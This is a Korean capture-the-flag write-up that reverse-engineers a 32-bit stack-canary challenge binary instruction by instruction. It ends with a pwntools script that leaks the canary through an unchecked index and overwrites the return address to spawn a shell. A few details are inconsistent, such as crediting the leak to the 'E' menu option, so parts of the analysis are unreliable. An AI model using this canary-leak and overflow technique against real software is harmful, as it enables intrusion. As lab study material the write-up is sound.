# SSP 분석

## 어셈블리 분석

---

### main 

```asm
0x804872f <main+4>     sub    esp, 0x94
```

- `esp` 레지스터 에게 `0x94(148)` 바이트 만큼 감소 시켜, stack에 `0x94(148)` 바이트 공간을 확보

```asm
0x8048735 <main+10>    mov    eax, dword ptr [ebp + 0xc]
```

- 현재 `ebp`의 값: `0xffffcf58`
- `[ebp + 0xc]` 연산 수행 → `0xffffcf58` + `0xc` = `0xffffcf64`
- `0xffffcf64` 주소 내부 값 분석 → `0xffffd01cffffd014`
- `0xffffd014` 주소 내부 값 분석 →  `x/s 0xffffd1ed`
- 결과 → **0xffffd1ed: "/home/kali/Desktop/ssp_001"**
- `0xffffd014` 주소 값을 `eax` 레지스터에게 복사

```asm
0x8048738 <main+13>    mov    dword ptr [ebp - 0x98], eax
```

- 현재 `eax`의 값: `0xffffd014`
- `[ebp - 0x98]` 연산 수행 → `0xffffcf58` - `0x98` = `0xffffcec0`(현재 esp의 주소)
- 현 `esp`의 주소 `0xffffcec0` 에게 `eax` 레지스터의 값 `0xffffd014` 을 복사

```asm
0x804873e <main+19>    mov    eax, dword ptr gs:[0x14]
```

- Canary 값을 `eax`로 읽어와서 `stack`에 백업해두려는 전처리 코드

```asm
0x8048744 <main+25>    mov    dword ptr [ebp - 8], eax
```

- `eax` 레지스터에 보관된 Canary 값을 **스택 최하위 주소 `ebp - 8` 에 복사**

```asm
0x8048747 <main+28>    xor    eax, eax
```

- `eax` 값을 `NULL`로 만듬

```asm
0x8048749 <main+30>    lea    edx, [ebp - 0x88]
```

- 현재 `ebp` 값 = `0xffffcf58`
- `[ebp - 0x88]` 연산 수행 → `0xffffcf58` - `0x88` = `0xffffced0`
- `0xffffced0` 주소 내부 값 분석 → `0xf7ffdbcc`
- 최종: **0xf7fbf6f0 ◂— ...**
- 결론: `0xffffced0` 이 값을 `edx` 레지스터 에게 로드

```asm
0x804874f <main+36>    mov    eax, 0
```

- `eax` 레지스터 에게 `0` 값을 복사

```asm
0x8048754 <main+41>    mov    ecx, 0x10
```

- `ecx` 레지스터 에게 `0x10(16)`의 값을 복사

```asm
0x8048759 <main+46>    mov    edi, edx
```

- `edx`의 값:  `0xffffced0`
- `0xffffced0` 값을 `edi` 레지스터 에게 복사

```asm
0x804875b <main+48>    rep stosd dword ptr es:[edi], eax
```

- **메모리 초기화 루틴: `edi` 주소부터 `eax` 값으로 4바이트씩 `ecx`번 채움**

```asm
0x804875d <main+50>    lea    edx, [ebp - 0x48]
```

- 현재 `ebp`의 값: `0xffffcf58`
- `[ebp - 0x48]` 연산 수행 → `0xffffcf58` - `0x48` = `0xffffcf10`
- `0xffffcf10` 주소 내부 값 분석 → **0xffffcf10 —▸ 0xf7fc5570 (__kernel_vsyscall)**
- `0xffffcf10` 값을 `edx` 레지스터 에게 로드

```asm
0x8048760 <main+53>    mov    eax, 0                         
0x8048765 <main+58>    mov    ecx, 0x10                      
0x804876a <main+63>    mov    edi, edx 
```

- 위와 동일

```asm
0x804876c <main+65>    rep stosd dword ptr es:[edi], eax
```

- **메모리 초기화 루틴: `edi` 주소부터 `eax` 값으로 4바이트씩 `ecx`번 채움**

```asm
0x804876e <main+67>     mov    word ptr [ebp - 0x8a], 0
```

- 현재 `ebp`의 값: `0xffffcf58`
- `[ebp - 0x8a]` 연산 수행 → `0xffffcf58` - `0x8a` = `0xffffcece`
- `0xffffcece` 주소 내부 값을 `0`으로 복사

```asm
0x8048777 <main+76>     mov    dword ptr [ebp - 0x94], 0
```

- 현재 `ebp`의 값: `0xffffcf58`
- `[ebp - 0x94]` 연산 수행 → `0xffffcf58` - `0x94` = `0xffffcec4`
- `0xffffcec4` 주소 내부 값을 `0`으로 복사

```asm
0x8048781 <main+86>     mov    dword ptr [ebp - 0x90], 0
```

- 연산 후 `0xffffcec8` 이 주소 내부 값을 `0`으로 복사

```asm
0x804878b <main+96>     call   initialize
```

- `initialize` 함수 호출

---

#### initialize 최종 c언어 예측 코드

> **전과 매우 동일한 어셈블리어 코드라 스킵 함.**

```c
void initialize() {
    setvbuf(0xf7f9d5c0(_IO_2_1_stdin_), 0, 2, 0);
    setvbuf(0xf7f9dd40(_IO_2_1_stdout_), 0, 2, 0);
    signal(0xe, alarm_handler());
    alarm(0x1e);
}
```

---

### main

```asm
0x8048790 <main+101>         call   menu
```

- `menu` 함수 호출

---

#### menu

```asm
0x80486f1 <menu>       push   ebp
0x80486f2 <menu+1>     mov    ebp, esp
```

- `push ebp`으로 현재 함수가 끝난 뒤, 이전 함수로 정확하게 돌아가기 위한 기준점 저장
- `mov ebp, esp`으로 새로운 스택 프레임으로 전환.

```asm
0x80486f4 <menu+3>     push   0x8048943
```

- 위 문자열 `0x8048943` 을 `stack`에 저장
→ **0x8048943: "[F]ill the box"**

```asm
0x80486f9 <menu+8>     call   puts@plt
```

- `puts` 함수 호출
> 최종: **puts("[F]ill the box");**

```asm
0x80486fe <menu+13>    add    esp, 4
0x8048701 <menu+16>    push   0x8048952
0x8048706 <menu+21>    call   puts@plt
```

- 방금 호출하기 위한 `stack`의 저장 값을 초기화

- 그 후, 위 문자열 `0x8048952` 을 `stack`에 저장
→ **0x8048952: "[P]rint the box"**
- `puts` 함수 호출

> 최종: **puts("[P]rint the box");**

```asm
0x804870b <menu+26>    add    esp, 4
0x804870e <menu+29>    push   0x8048962
0x8048713 <menu+34>    call   puts@plt 
```

- 방금 호출하기 위한 `stack`의 저장 값을 초기화

- 그 후, 위 문자열 `0x8048962` 을 `stack`에 저장
→ **0x8048962: "[E]xit"**
- `puts` 함수 호출

> 최종: **puts("[E]xit");**

```asm
0x8048718 <menu+39>    add    esp, 4       
0x804871b <menu+42>    push   0x8048969
0x8048720 <menu+47>    call   printf@plt
```

- 방금 호출하기 위한 `stack`의 저장 값을 초기화

- 그 후, 위 문자열 `0x8048969` 을 `stack`에 저장
→ **0x8048969: "> "**
- `printf` 함수 호출

> 최종: **printf("> ");**

```asm
0x8048725 <menu+52>    add    esp, 4
0x8048728 <menu+55>    nop    
0x8048729 <menu+56>    leave  
0x804872a <menu+57>    ret
```

- 함수 스택 정리하고 호출한 위치로 리턴

---

#### menu 최종 c언어 예측 코드

```c
void menu() {
    puts("[F]ill the box");
    puts("[P]rint the box");
    puts("[E]xit");
    printf("> ");
}
```

---

### main

```asm
0x8048795 <main+106>    push   2
```

- `stack`에 `2` 값을 푸쉬
- 세 번째 인자로 추측

```asm
0x8048797 <main+108>    lea    eax, [ebp - 0x8a]
```

- `[ebp - 0x8a]` 연산 후 값 → `0xffffcece`
- 위 값을 `eax` 레지스터 에게 로드

```asm
0x804879d <main+114>    push   eax
```

- `stack`에 `eax` 레지스터 값을 푸쉬
- 두 번째 인자로 추측

```asm
0x804879e <main+115>    push   0
```

- `stack`에 `0` 값을 푸쉬
- 첫 번째 인자로 추측

```asm
0x80487a0 <main+117>    call   read@plt
```

- `read` 함수 호출
- 입력한 값을 `0xffffcece` 주소에 저장

```asm
0x80487a5 <main+122>    add    esp, 0xc
```

- 함수를 호출 하기 위해 push 했던 `stack` 초기화 작업

```asm
0x80487a8 <main+125>    movzx  eax, byte ptr [ebp - 0x8a]
0x80487af <main+132>    movsx  eax, al
```

- 현재 `ebp`의 값: `0xffffcf58`
- `[ebp - 0x8a]` 연산 수행 → `0xffffcf58` - `0x8a` = `0xffffcece`
- `0xffffcece` **read 함수에 입력한 값**
- 이후 **read 함수에서 입력한 값(하위 레지스터 1바이트)**을 `eax` 레지스터 에게 전달

```asm
0x80487b2 <main+135>    cmp    eax, 0x46 
```

- `eax` 값 **read 함수에 입력한 값(인덱스 0번째)**
- `cmp` 비교 연산 수행, **플래그 레지스터 동작**
- `0x46`의 값 (`'F'`) 문자와 비교 

```asm
0x80487b5 <main+138>  ✘ je     main+155
```

- 만약 입력한 값이 `F`와 일치하면 연산 값 `0` je 활성화
- 입력한 값이 `F`와 일치하지 않으면  연산 값 `0` je 비활성화

> 추측: **char 0xffffcece[1]; read(0, 0xffffcece, 2); if(0xffffcece != "F") {return 0;} else if {return 0;}**

```asm
0x80487c6 <main+155>    push   0x804896c
```

---

#### main 'F'

- `F` 문자열을 통한 `IF` 문을 통과할 경우 `0x804896c` 문자열을 스택에 푸쉬
→ **box input :** 

```asm
0x80487cb <main+160>    call   printf@plt
```

- `printf` 함수 호출
> 최종: **printf("box input :")** 

```asm
0x80487d0 <main+165>    add    esp, 4
```

- 방금 호출하기 위한 `stack`의 저장 값을 초기화

```asm
0x80487d3 <main+168>    push   0x40
```

- `0x40(64)` 값 을 `stack`에 푸쉬

```asm
0x80487d5 <main+170>    lea    eax, [ebp - 0x88]
0x80487db <main+176>    push   eax
```

- `[ebp - 0x88]` 연산 주소 값 → `0xffffced0`
- `0xffffced0` 값을 `stack`에 푸쉬

```asm
0x80487dc <main+177>    push   0
```

- `stack`에 `0` 값 을 푸쉬

```asm
0x80487de <main+179>    call   read@plt
```

- `read` 함수 호출
> 최종: **read(0, 0xffffced0, 0x40);**

```asm
0x80487e3 <main+184>    add    esp, 0xc
```

- 함수 호출 `stack` 값 초기화

```asm
0x80487e6 <main+187>    jmp    main+335
```

- `main+335` 주소로 점프!

```asm
0x804887a <main+335>    jmp    main+101                   
0x8048790 <main+101>    call   menu
```

- `jmp` 후 다시 `main+101`로 점프해 `menu` 함수 호출
- `while`문 유추 가능

---

#### main 'P'

```asm
0x80487eb <main+192>    push   0x8048979
```

- `P` 문자열을 통한 `IF` 문을 통과할 경우 `0x8048979` 문자열을 스택에 푸쉬
→ **Element index :** 

```asm
0x80487f0 <main+197>    call   printf@plt
```

- `printf` 함수 호출
> 최종: **printf("Element index :")** 

```asm
0x80487f5 <main+202>    add    esp, 4
```

- 함수 호출 `stack` 값 초기화

```asm
0x80487f8 <main+205>    lea    eax, [ebp - 0x94]
```

- `[ebp - 0x94]` 연산 실행 → `0xffffcec4`
- 위 값을 `eax` 레지스터 에게 로드

```asm
0x80487fe <main+211>    push   eax
```

- `eax` 레지스터 값을 push

```asm
0x80487ff <main+212>    push   0x804898a
```

- `0x804898` 문자열을 push
→ **0x804898a: "%d"**

```asm
0x8048804 <main+217>    call   __isoc99_scanf@plt
```

- `scanf` 함수 호출
> 최종: **scanf("%d", 0xffffcec4)**

```asm
0x8048809 <main+222>    add    esp, 8
```

- 함수 호출 `stack` 초기화

```asm
0x804880c <main+225>    mov    eax, dword ptr [ebp - 0x94]
0x8048812 <main+231>    push   eax
```

- `[ebp - 0x94]` 연산 수행 → `0xffffcec4`
→ **0xffffcec4:     0x7fffffff**
- `eax` 레지스터에 `0x7fffffff` 값을 복사후 푸쉬

```asm
0x8048813 <main+232>    lea    eax, [ebp - 0x88]               EAX => 0xffffced0 ◂— 0
0x8048819 <main+238>    push   eax
```

- `[ebp - 0x88]` 연산 수행 → `0xffffced0`
- `0xffffced0` 주소값을 `eax` 레지스터 에 로드후 푸쉬

```asm
0x804881a <main+239>    call   print_box
```

- `print_box` 함수 호출
> 최종: **print_box(0xffffced0, 0x7ffffff);**

```asm
0x804881f <main+244>    add    esp, 8
0x8048822 <main+247>    jmp    main+335                   
0x804887a <main+335>    jmp    main+101
```

- 함수 호출 초기화 후 `menu` 함수까지 `jmp`
- while 문 의심

---

#### main 'E'

- `E` 를 입력시 `IF` 문 작동

```asm
0x8048824 <main+249>    push   0x804898d
0x8048829 <main+254>    call   printf@plt
```

- 문자열 `0x804898d` push
→ **"Name Size : "**

```asm
0x8048829 <main+254>    call   printf@plt
```

- `printf` 함수 호출
> 최종: **printf("Name Size : ");**

```asm
0x804882e <main+259>    add    esp, 4
0x8048831 <main+262>    lea    eax, [ebp - 0x90]
0x8048837 <main+268>    push   eax
0x8048838 <main+269>    push   0x804898a
```

- 함수 호출 `stack` 제거
- `[ebp - 0x90]` 연산 수행 → `0xffffcec8`
- `0xffffcec8` 값을 `eax` 레지스터 에게 로드후 푸쉬
- 문자열 `0x804898a` 을 푸쉬
→ **0x804898a: "%d"**

```asm
0x804883d <main+274>    call   __isoc99_scanf@plt
```

- `scanf` 함수 호출
> 최종: **scanf("%d", 0xffffcec8);**

```asm
0x8048842 <main+279>    add    esp, 8                
0x8048845 <main+282>    push   0x804899a
0x804884a <main+287>    call   printf@plt                  <printf@plt>
```

- 함수 호출 초기화 후 문자열 `0x804899a` 푸쉬
→ **0x804899a: "Name : "**
- 후에 `printf` 함수 호출
> 최종: **printf("Name : ");**

```asm
0x804884f <main+292>    add    esp, 4
```

- 함수 호출 초기화

```asm
0x8048852 <main+295>    mov    eax, dword ptr [ebp - 0x90]
0x8048858 <main+301>    push   eax
```

- `[ebp - 0x90]` 연산 수행 → `0xffffcec8`
- `0xffffcec8` 내부의 값 → **방금 적었던 scanf 값**
- `scanf` 값을 `eax` 레지스터 에게 복사후 푸쉬

```asm
0x8048859 <main+302>    lea    eax, [ebp - 0x48]               EAX => 0xffffcf10 ◂— 0
0x804885c <main+305>    push   eax
0x804885d <main+306>    push   0
```

- `[ebp - 0x48]` 연산 수행 → `0xffffcf10`
- `0xffffcf10` 주소를 `eax` 레지스터 에게 로드후 푸쉬
- `0` 의 값도 푸쉬

```asm
0x804885f <main+308>    call   read@plt
```

> 최종: **read(0, 0xffffcf10, 0xffffcec8(scanf 값));**

--- 

### main

```asm
0x8048864  <main+313>    add    esp, 0xc                    
0x8048867  <main+316>    mov    eax, 0                       
0x804886c  <main+321>    mov    edx, dword ptr [ebp - 8]   
0x804886f  <main+324>    xor    edx, dword ptr gs:[0x14]    
0x8048876  <main+331>    je     main+345                    
0x8048884  <main+345>    mov    edi, dword ptr [ebp - 4]     
0x8048887  <main+348>    leave  
0x8048888  <main+349>    ret  
```

- 맨 처음 저장했던 **Canary 값을 불러와 `edx` 레지스터에 삽입**
- 비교 후 맞으면 정상 종료, 틀리면 강제 종료

---

#### main 최종 c언어 추측

```c

int main() {
    char buf[0x94]; // 0xffffcec0 == buf 변수 유추


    initialize();

    while(1) {
        menu();
    
        read(0, 0xffffcece, 2);
        if(0xffffcece[0] == 'F') {
            printf("box input :");
            read(0, 0xffffced0, 0x40);
            continue;
        }
        else if(0xffffcece[0] == 'P') {
            printf("Element index :");
            scanf("%d", 0xffffcec4);
            print_box(0xffffced0, 0x7ffffff);
            continue;
        }
        else if(0xffffcece[0] == 'E') {
            printf("Name Size : ");
            scanf("%d", 0xffffcec8);
            printf("Name : ");
            read(0, 0xffffcf10, 0xffffcec8(scanf 값));
            break;
        }        
        else {
            break;
        }
    }
}
```
> **위 코드는 실제 소스코드를 보지 않고, 리버싱 분석만으로 추정한 C 코드입니다.**

---

## 결론

### 구조 분석

- `[rbp - 8]` 주소 위치에 Canary 값 저장
- `0xffffcece[0]` 의 값 `F` 일시 입력 후 `0xffffced0` 스택에 값을 저장 → **Canary 저장 주소와 `128` 바이트 떨어져 있음**
- `0xffffcece[0]` 의 값 `E` 일시 입력 후 `0xffffcf10` 스택에 값을 저장 → **Canary 저장 주소와 `64` 바이트 떨어져 있음**
- `F` 일시 `read` 함수가 총 `0x40` 바이트 까지만 저장을 함
- 하지만 `E` 에선 위의 조건을 제외하고 `0x40` 바이트 이상 `print_box` 함수에 의해 출력이 됨. (**이를 통해 Canary 값을 구할 수 있음**)

---

### 파이썬 페이로드

```python
from pwn import *
context.log_level = 'debug'

p = process("./ssp_01")

byte_result = []

p.sendafter(b'> ', b'F')
padding = b'A' * 129
p.recvuntil(b'box input : ')
p.sendline(padding)


for i in [128, 129, 130, 131]:
    p.sendafter(b'> ', b'P')
    p.recvuntil(b'Element index : ')
    p.sendline(str(i).encode())
    byte = p.recv(29).decode().split()[-1]
    byte_result.append(byte)

canary_list = ''.join(byte_result)
canary_hex = bytes.fromhex(canary_list)
canary = u32(canary_hex)

shell = 0x080486b9

p.sendafter(b'> ', b'E')
p.sendlineafter(b'Name Size : ', b'1000')
p.recvuntil(b'Name : ')

payload = b'A' * 64 
payload += p32(canary)
payload += b'B' * 8
payload += p32(shell)

p.sendline(payload)

p.interactive()
```




